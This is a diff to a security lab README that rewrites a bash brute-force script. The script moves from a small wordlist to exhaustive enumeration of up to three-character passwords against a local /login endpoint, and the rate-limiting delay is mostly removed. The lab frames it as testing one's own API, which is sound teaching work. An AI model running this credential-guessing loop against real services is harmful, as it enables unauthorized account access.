@@ -98,17 +98,18 @@ File: **`brute.sh`** (included). Run in **Git Bash** while the API is running:
 ### Controlled brute-force script (what this does)
 
 The script below performs a **controlled** brute-force test **against your own local API**.  
-It iterates over a small wordlist, sends a POST to `/login` for each guess, and **stops on the first success**.  
+It iterates over a small **charset**, sends a POST to `/login` for each guess, and **stops on the first success**.  
 You can safely tweak:
 - `API` → URL of your local server (change port if needed)
 - `USER` → the username to test (e.g., `demo`, `admin`, `leo`)
-- `WORDLIST` → the candidate passwords you want to try
-- `sleep 0.2` → delay between attempts to keep the test controlled
+- `CHARS` → the candidate characters you want to try (e.g., letters, numbers)
+- `MAXLEN` → the maximum password length to try
+- `PAUSE_EVERY` and `PAUSE_TIME` → control how often to pause to avoid overloading the API
 
 ```bash
 # brute.sh — controlled brute-force demo
 # How it works:
-# 1) Reads candidate passwords from WORDLIST (array below).
+# 1) Reads candidate passwords from the given charset.
 # 2) For each candidate, sends POST /login to your local API.
 # 3) If the response contains "login successful", it prints the finding and exits.
 # Safety:
@@ -117,38 +118,76 @@ You can safely tweak:
 # You can change:
 # - API:  if your server runs on a different host/port.
 # - USER: which username to test (demo/admin/leo/...).
-# - WORDLIST: add/remove candidate passwords.
+# - CHARS: the character set to use for password combinations (letters, digits).
+# - MAXLEN: the maximum password length to try (1–3).
 
 #!/usr/bin/env bash
 API="http://127.0.0.1:8000/login"
 USER="leo"   # change to 'demo' or 'admin' if you want
 
-WORDLIST=(pass123 123456 admin admin123 demo secret qwerty password adios) #Add here the weak passwords
+# Character set (letters + digits)
+CHARS=(a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9)
+MAXLEN=3
+DELAY=0
+PAUSE_EVERY=400
+PAUSE_TIME=0.15
 
 attempts=0
 start=$(date +%s)
 
-for pwd in "${WORDLIST[@]}"; do
+attempt() {
+  pwd="$1"
   attempts=$((attempts+1))
-  resp=$(curl -s -X POST "$API" \
-    -H "accept: application/json" \
+
+  payload='{"username":"'"$USER"'","password":"'"$pwd"'"}'
+  resp=$(curl -s "$API" \
     -H "Content-Type: application/json" \
-    -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
-  echo "[$attempts] Trying '$pwd' -> $resp"
+    --data "$payload")
+
+  echo "[$attempts] '$pwd' -> $resp"
+
   if [[ "$resp" == *"login successful"* ]]; then
     end=$(date +%s)
     echo "FOUND: password='$pwd' in $attempts attempts, $((end-start))s"
     exit 0
   fi
-  sleep 0.2
+
+  # Pausa cada N intentos (controlado pero rápido)
+  if (( attempts % PAUSE_EVERY == 0 )); then
+    sleep "$PAUSE_TIME"
+  fi
+}
+
+echo "[*] Brute-force on '$USER' | chars=${CHARS[*]} | maxlen=$MAXLEN"
+
+# len=1
+for c1 in "${CHARS[@]}"; do
+  attempt "$c1"
 done
 
-end=$(date +%s)
-echo "NOT found after $attempts attempts in $((end-start))s"
-exit 1
+# len=2
+if [ "$MAXLEN" -ge 2 ]; then
+  for c1 in "${CHARS[@]}"; do
+    for c2 in "${CHARS[@]}"; do
+      attempt "$c1$c2"
+    done
+  done
+fi
 
+# len=3
+if [ "$MAXLEN" -ge 3 ]; then
+  for c1 in "${CHARS[@]}"; do
+    for c2 in "${CHARS[@]}"; do
+      for c3 in "${CHARS[@]}"; do
+        attempt "$c1$c2$c3"
+      done
+    done
+  done
+fi
+
+echo "NOT found (up to length $MAXLEN). Attempts: $attempts"
+exit 1
 ```
-> Keep a small delay (e.g., `sleep 0.2`) so the test is **controlled** and you don’t overwhelm the local API.
 
 ### What to report (example)
 - Target user: `admin`  
